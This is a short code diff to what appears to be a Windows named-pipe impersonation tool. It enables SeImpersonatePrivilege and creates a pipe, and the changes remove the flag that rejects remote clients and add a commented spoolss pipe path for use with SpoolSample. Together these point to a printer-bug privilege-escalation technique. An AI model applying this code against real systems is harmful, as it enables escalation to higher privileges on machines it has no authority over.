@@ -89,7 +89,8 @@ static void* create_np(char* p_name)
 	p_pipe = CreateNamedPipeA(
 		p_name,
 		PIPE_ACCESS_DUPLEX,
-		PIPE_TYPE_BYTE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
+		0,
+		//PIPE_TYPE_BYTE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
 		2, // Max instances
 		0, // Out size
 		0, //In size
@@ -202,6 +203,9 @@ int main(int argc, char *argv[])
 
     OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &p_ptoken);
     enable_privilege(p_ptoken, "SeImpersonatePrivilege");
+    // FOR SPOOLSAMPLE USE SPOOLSS
+    //p_pipe = create_np("\\\\.\\pipe\\test\\pipe\\spoolss");
+
     p_pipe = create_np(argv[1]);
     if (p_pipe != NULL) {
         printf("[+] Connection recieved\n");
